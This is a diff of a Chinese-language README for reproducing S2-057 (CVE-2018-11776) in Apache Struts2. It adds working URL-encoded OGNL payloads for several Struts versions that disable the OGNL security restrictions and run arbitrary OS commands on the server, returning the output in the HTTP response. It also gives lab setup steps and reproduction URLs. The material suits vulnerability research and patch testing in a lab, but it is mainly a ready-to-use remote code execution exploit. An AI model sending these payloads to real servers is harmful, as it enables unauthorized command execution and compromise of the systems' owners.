@@ -4,10 +4,28 @@ FN@悬镜安全实验室
 
 ## POC
 
-测试发现结合S2-045构造的POC堪称完美，linux和windows通用，应该可执行任意命令，返回格式舒服且无乱码，当然是根据各位大佬的poc自行测试构造的，适用于Struts 2.3.34，而Struts 2.5.16的poc还没测试成功，等大佬们的poc吧
+测试发现结合S2-045构造的POC堪称完美，linux和windows通用，应该可执行任意命令，返回格式舒服且无乱码，当然是根据各位大佬的poc自行测试构造的
+
+- struts 2.5.16：
+
+第一次poc请求会500，然后再次请求命令执行成功，原因未知，猜测是setExcluded*的问题
 
 ```
-$%7B(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3D%23request%5B'struts.valueStack'%5D.context).(%23cr%3D%23ct%5B'com.opensymphony.xwork2.ActionContext.container'%5D).(%23ou%3D%23cr.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23ct.setMemberAccess(%23dm)).(%23cmd%3D'whoami').(%23iswin%3D(%40java.lang.System%40getProperty('os.name').toLowerCase().contains('win'))).(%23cmds%3D(%23iswin%3F%7B'cmd.exe','/c',%23cmd%7D%3A%7B'/bin/bash','-c',%23cmd%7D)).(%23p%3Dnew%20java.lang.ProcessBuilder(%23cmds)).(%23p.redirectErrorStream(true)).(%23process%3D%23p.start()).(%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())).(%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream(),%23ros)).(%23ros.flush())%7D
+$%7B(%23ct%3D%23request%5B'struts.valueStack'%5D.context).(%23cr%3D%23ct%5B'com.opensymphony.xwork2.ActionContext.container'%5D).(%23ou%3D%23cr.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou.setExcludedClasses('java.lang.Shutdown')).(%23ou.setExcludedPackageNames('sun.reflect.')).(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct.setMemberAccess(%23dm)).(%23cmd%3D'whoami').(%23iswin%3D(%40java.lang.System%40getProperty('os.name').toLowerCase().contains('win'))).(%23cmds%3D(%23iswin%3F%7B'cmd','/c',%23cmd%7D%3A%7B'/bin/bash','-c',%23cmd%7D)).(%23p%3Dnew%20java.lang.ProcessBuilder(%23cmds)).(%23p.redirectErrorStream(true)).(%23process%3D%23p.start()).(%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())).(%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream(),%23ros)).(%23ros.flush())%7D
+```
+
+- struts 2.3.34：
+
+本地测试发现下面poc中的(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear())去掉也能执行成功
+
+```
+$%7B(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3D%23request%5B'struts.valueStack'%5D.context).(%23cr%3D%23ct%5B'com.opensymphony.xwork2.ActionContext.container'%5D).(%23ou%3D%23cr.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23ct.setMemberAccess(%23dm)).(%23cmd%3D'whoami').(%23iswin%3D(%40java.lang.System%40getProperty('os.name').toLowerCase().contains('win'))).(%23cmds%3D(%23iswin%3F%7B'cmd','/c',%23cmd%7D%3A%7B'/bin/bash','-c',%23cmd%7D)).(%23p%3Dnew%20java.lang.ProcessBuilder(%23cmds)).(%23p.redirectErrorStream(true)).(%23process%3D%23p.start()).(%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())).(%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream(),%23ros)).(%23ros.flush())%7D
+```
+
+- struts 2.3.20、struts 2.2.3.1等：
+
+```
+$%7B(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23cmd%3D'whoami').(%23iswin%3D(%40java.lang.System%40getProperty('os.name').toLowerCase().contains('win'))).(%23cmds%3D(%23iswin%3F%7B'cmd','/c',%23cmd%7D%3A%7B'/bin/bash','-c',%23cmd%7D)).(%23p%3Dnew%20java.lang.ProcessBuilder(%23cmds)).(%23p.redirectErrorStream(true)).(%23process%3D%23p.start()).(%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())).(%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream(),%23ros)).(%23ros.flush())%7D
 ```
 
 注意：/不能编码为%2f，这个坑了好久，tomcat的原因
@@ -18,9 +36,13 @@ war包：
 
 https://archive.apache.org/dist/struts/2.5.16/struts-2.5.16-all.zip
 
-https://archive.apache.org/dist/struts/2.3.34/struts-2.3.34-all.zip 
+https://archive.apache.org/dist/struts/2.3.34/struts-2.3.34-all.zip
 
-其中的struts2-showcase.war，当然这里也提供了对应的war包
+https://archive.apache.org/dist/struts/2.3.20/struts-2.3.20-all.zip
+
+http://archive.apache.org/dist/struts/binaries/struts-2.2.3.1-all.zip
+
+其中的struts2-showcase.war，当然这里提供了部分war包
 
 - windows
 
@@ -78,7 +100,9 @@ http://localhost:8080/S2-057-2-3-34/${(111+111)}/actionChain1.action
 
 - linux
 
-使用p牛的vulhub，当然需要修改配置。
+直接使用p牛的vulhub：https://github.com/vulhub/vulhub/tree/master/struts2/s2-057
+
+或者根据需要修改配置，比如：
 
 https://github.com/vulhub/vulhub/tree/master/struts2/s2-015
 
@@ -131,7 +155,7 @@ docker rmi image_id
 
 ## 漏洞复现
 
-只提供了windows下的部分截图，linux也复现成功了的，不过未再提供截图
+只提供了windows下的部分截图
 
 1.Redirect action
 
@@ -165,13 +189,15 @@ http://HOST/S2-057-2-3-34/POC/actionChain3.action
 
 [【Struts2-代码执行漏洞分析系列】S2-057](https://xz.aliyun.com/t/2618)
 
+[Struts2-057/CVE-2018-11776两个版本RCE漏洞分析（含EXP）](https://www.anquanke.com/post/id/157823)
+
+[S2-057 漏洞环境搭建及EXP构造(Struts2 2.5.16)](https://otakekumi.github.io/2018/08/25/S2-057-%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E3%80%81%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E5%8F%8AEXP%E6%9E%84%E9%80%A0/)
+
 https://github.com/jas502n/St2-057
 
 https://lgtm.com/blog/apache_struts_CVE-2018-11776
 
 ## TODO
 
-1. Struts 2.5.16 poc
-2. 其他版本测试
-3. 通用检测脚本，发现有的脚本只检测了Redirect action的情况，看大佬们的介绍应该还存在其他情况
-4. 实际测试
+1. 通用检测脚本，发现有的脚本只检测了Redirect action的情况
+2. 实际测试
